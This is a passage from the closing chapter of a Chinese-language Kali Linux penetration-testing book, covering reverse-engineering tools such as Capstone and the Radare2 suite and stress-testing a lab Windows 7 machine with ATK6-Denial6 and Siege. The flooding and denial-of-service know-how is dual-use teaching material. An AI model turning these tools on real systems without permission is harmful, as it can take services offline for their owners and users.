![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/c44bb035-7c44-4db7-8979-3f9e37c34738.png)

最后，这是反编译的源代码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/0dc44f26-9e68-4174-8de9-eb155d7f2ce9.png)

# 使用 Capstone 创建自己的反汇编代码

Capstone 反编译引擎得到很好的维护，并且有一个简单的 API。基本的 Capstone 库默认安装在 Kali Linux 上，您可以使用任何您熟悉的语言构建自己的前端。我们使用 Python，因为它是我们首选的脚本语言。使用`aptitude search <keyword>`命令结构，您可以确保您有可用的软件包，并查看软件包的状态。在这种情况下，您可以看到第一列中的`p`表示有一个可用的软件包，`i`表示已安装。第二列中的`A`表示该软件包是自动安装的，可能是某个其他软件包的依赖。我们选择`install libcapstone-dev`，用于 Kali 实例上的 64 位架构，以防我们想尝试自定义 Capstone 的行为。您不需要这样做来使用 Capstone：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/18a2332d-611a-4d8a-b514-151fa6d53b49.png)

这是一个简单的反汇编脚本，基于[`www.capstone-engine.org/lang_python.html`](http://www.capstone-engine.org/lang_python.html)上的示例。这可以更加自动化，但为了这个例子，十六进制代码是硬编码到脚本中的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/0ea09aad-578b-452a-bb66-ca1bfe93bf07.png)

# 一些其他的逆向工程工具

有一大类其他的逆向工程工具，在 Kali Linux 1.x 菜单中列为此类，但在 Kali Linux 2.0 菜单中没有分类。我们不是随机选择其中的一些，而是向您展示了由 Radare2 领导的一套集成工具。

# 运行 Radare2

您可以通过单击逆向工程下的菜单链接来启动 Radare2。您现在可能更习惯于使用命令行，所以您可能想直接在命令行中打开它。通过键入键盘快捷键*Alt* + *F2*来打开命令行启动器。然后，以下命令在新的终端窗口中打开程序的帮助文件：

```
bash -c "radare2 -h" #  this makes sure that you are opening the bash 
 shell  
                     #  rather than some other possible default shell  
                     #  like the dash shell 
```

让我们为您解释一下这个命令：

+   `bash`打开一个 Bash shell。

+   `-c`指示破折号从一个命令字符串中读取，该命令字符串在双引号中跟随，而不是等待键盘的标准输入。

+   `radare2`是我们正在打开的应用程序。

+   `-h`是打开终端窗口中的帮助文件的选项，如果存在的话。`--help`是该选项的长格式（这些选项几乎在每个 Linux 命令行工具上都可用）。

Radare2 是一个高级的命令行十六进制编辑器、反汇编器和调试器。Radare2 ([`radare.org`](http://radare.org))表示 Radare2 是一个具有以下特点的可移植逆向框架：

+   对许多不同的架构进行反汇编（和汇编）

+   使用本地本机和远程调试器进行调试（gdb、rap、webui、r2pipe、winedbg 和 windbg）

+   在 Linux、*BSD、Windows、OSX、Android、iOS、Solaris 和 Haiku 上运行

+   对文件系统和数据进行取证和数据刻录

+   用 Python、JavaScript、Go 等脚本编写

+   支持使用嵌入式 Web 服务器进行协作分析

+   可视化多种文件类型的数据结构

+   修补程序以发现新功能或修复漏洞

+   使用强大的分析能力加快逆向

+   帮助软件开发

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/63b6c01b-49ad-48cf-a871-5ecb87bcc76d.png)

Radare2 是一个集成了十个插件和其他几个应用程序的框架的顶端。为了保持 PG 评级，我们模糊了最后一个插件的名称：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/610b1ed6-59c0-4d28-8ca1-bcf5c48b2212.png)

# Radare2 工具套件的其他成员

我们将在以下部分讨论 Radare2 工具套件的其他成员。

# 运行 rasm2

rasm2 `/usr/bin/rasm2`是一个用于多种架构的命令行汇编器/反汇编器，例如 Intel x86 和 x86-64、MIPS、ARM、PowerPC、Java 和 MSIL。当 JAD 不再可用时，这可能是你的反汇编工具：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/1e81f6b2-70d4-496a-8af9-71e919d37614.png)

# 运行 rahash2

rahash2 `/usr/bin/rahash`是一个基于块的哈希工具，支持许多算法，例如 MD4、MD5、CRC16、CRC32、SHA1、SHA256、SHA384、SHA512、par、xor、xorpair、mod255、hamdist 和 entropy。你可以使用`rahash2`来检查文件、内存转储和磁盘的完整性，并跟踪变化：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/36e0dc00-57dc-44b5-a869-e3fda48c622e.png)

以下是对小文件进行 sha256 哈希测试的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/68ab55b7-b278-4ab6-bab6-728074a41cd5.png)

# 运行 radiff2

radiff2 是一个使用各种算法比较文件的二进制实用程序。它支持二进制文件的字节级或增量比较，以及代码分析比较，以找到`radare`代码分析产生的代码块中的变化。以下是一个比较`/var/log/message`日志在几秒钟内的两个状态的测试。这是一个在位级别进行比较的测试，用于随机更改：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/8c64b9c4-412b-4e9b-8d44-4ff73b16ebc2.png)

# 运行 rafind2

rafind2 旨在在文件中搜索模式。在下面的示例中，`rafind2 -s "string searched" <file>`向我们展示了当我们搜索一个我们知道存在的字符串和一个我们知道不存在的字符串时，我们能看到什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/48233c42-8587-4854-81d2-93ba7cb3c44e.png)

# 运行 rax2

rax2 是一个命令行的数学表达式求值器。你可以进行许多转换操作，包括对浮点值、十六进制表示、十六进制对字符串到 ASCII 的基数转换等等。它还支持字节序设置，如果没有给出参数，可以用作交互式 shell：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/c7cd4858-5ad6-43cc-b5ca-d02cb126cab7.png)

以下是 rax2 的一些示例转换：

+   十进制转十六进制

+   十六进制转十进制

+   八进制转十六进制

+   对两个字符串进行哈希

+   对单个字符串进行哈希

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/c6307c77-db85-484f-a975-a99077185542.png)

# 压力测试 Windows

接下来，让我们看一些会让你的 Windows 机器哭泣的工具。对系统进行压力测试可以显示出你的机器和网络能承受多大负荷。你也可以进行一个小实验。在 Windows 机器上设置一个服务，在 Linux 机器上设置相同类型的服务，看看哪个能更好地处理负载。结果可能会让你感到惊讶。结果可能会让你问*为什么我要使用 Windows？*

**黑客提示**：

将 Linux 作为你的日常驱动操作系统——我就是！

# 处理拒绝

**ATK6-Denial6**是一个 IPv6 网络压力测试工具，它向目标主机发送数据包并将其击败。这是 ATK6-Denial6 的帮助文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/6ec7068c-d795-4824-9180-9f6b7bb96736.png)

以下截图是对易受攻击的 Windows 7 目标机器进行的`nmap -A`读取。我们想要找出它是否有开放的端口，以及它们是哪些端口。我们可以看到端口`139`、`445`、`2869`、`5357`和`10243`是开放的。这个工具的一个大问题是测试网络是 IPv4：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/290e14d3-7991-42ad-b379-31dbb5d56cdf.png)

让我们找一个可以攻击我们的 IPv4 网络的工具。

# 让网络陷入围攻

Siege 是一个 Web 压力测试工具。Siege 是一个多线程的 HTTP 负载测试和基准测试实用程序。它旨在让 Web 开发人员在压力下测量其代码的性能。它允许您使用可配置数量的并发模拟用户访问 Web 服务器。

正是这些用户将 Web 服务器置于*围攻*之下。性能指标包括以下内容，每次运行结束时都会进行量化和报告：

+   经过的时间

+   总传输数据

+   服务器响应时间

+   事务率

+   吞吐量

+   并发

+   OK 返回计数

它们的含义和重要性稍后会讨论。围攻基本上有三种操作模式：

+   回归（在被轰炸时调用）

+   模拟互联网

+   蛮力

使用 siege 的格式如下：

+   `siege [options]`

+   `siege [options] [url]`

+   `siege -g [url]`

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/c7a27efd-88fe-4af4-8294-524938eca229.png)

围攻模拟了 15 个用户访问 Windows 7 目标机器上的网站。总体性能并不算太差。在四分半钟内，网站有 8072 次点击。Windows 7 目标机器保持 100%的可用性，响应时间低于 1/100 秒。

# 配置您的围攻引擎

如果我们将围攻者的数量增加到 10,000，你认为会发生什么？配置文件在`/usr/bin/siege.config`。当我们在命令行上运行时，它告诉我们我们已经有一个本地配置文件在`/root/siegerc`，所以让我们去看看：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/9ec4021f-e519-44c5-bd87-bc4b7ab93227.png)

要编辑`/root/.siegerc`，我们可以使用命令行或运行启动器（*Alt* + *F2*）输入我们喜欢的文本编辑器的名称。在这里，我们将使用 gedit，所以输入 gedit `/root/.siegerc`。或者，我们可以在`Usual Applications`/`Accessories`文件夹中找到 gedit，打开文件对话框并打开隐藏文件，然后在`/root`目录中找到`.siegerc`。你可能已经开始明白为什么 Linux 管理员如此喜欢命令行了。

在配置文件的第 162 行，您会找到并发用户的数量。当前默认值为`15`，但让我们将其更改为 10,000。让我们看看我们能否破解这个：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/df072eea-fec9-4844-b93f-619d19719d7e.png)

在强制关闭 Kali 实例后，让我们尝试使用更少的围攻者。并发用户数量越多，它在您的 Kali 机器上使用的 RAM 也就越多：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/f8b800dd-f2d4-40c8-b47f-f1c4c8560daa.png)

使用 625 个围攻者，我们得到了一个稳定的结果，而没有使测试机器崩溃。期间，我们测试了 5,000、2,500 和 1,250，但它们都使机器崩溃了。如果您有一点乐趣，您可以测试更高的数字，比如 940、1,090 等。您可以使用测试机器上的资源来决定您可以使用的围攻者数量。

# 总结

逆向工程以获得复杂应用的实际代码的明确答案是不太可能的，因为有许多通过循环或选择结构实现相同输出的方法。通过测试其中几种可能的输入处理方法，更容易获得统计列表。您可能会从查看**EDB-Debugger**或**OllyDbg**的汇编代码输出中获得更多细节。您可能已经注意到，Linux 和 Windows 应用程序的汇编代码基本上是相同的。高级语言如 C 和 C++只是访问汇编代码的方式，可以轻松转换为机器代码，告诉机器该做什么。

对 Windows 主机进行压力测试归结为检查它们在任何开放端口上在短时间内接收许多输入的能力。请记住，在进行压力测试时，您将在网络上制造很多噪音，任何正确配置的入侵检测工具都会注意到您的攻击。您还可能使目标机器脱离网络，因此在开始测试之前最好通知管理层。

由于这是最后一章，我们希望您喜欢这本书，也希望您学到了一些东西，以便更好地理解渗透测试和对 Windows 操作系统的利用。

感谢阅读本书。

# 进一步阅读

+   **有关 Radare2 工具套件的更多阅读**：[`rada.re/r/`](https://rada.re/r/)

+   **Radare2 备忘单**：[`github.com/pwntester/cheatsheets/blob/master/radare2.md`](https://github.com/pwntester/cheatsheets/blob/master/radare2.md)

+   **有关 EDB-Debugger 的更多信息**：[`github.com/eteran/edb-debugger`](https://github.com/eteran/edb-debugger) 和 [`codef00.com/projects`](http://codef00.com/projects)

+   **有关 OllyDbg 的更多信息**：[`www.ollydbg.de/`](http://www.ollydbg.de/)

+   **有关 Capstone 的更多信息**：[`www.capstone-engine.org/lang_python.html`](http://www.capstone-engine.org/lang_python.html)
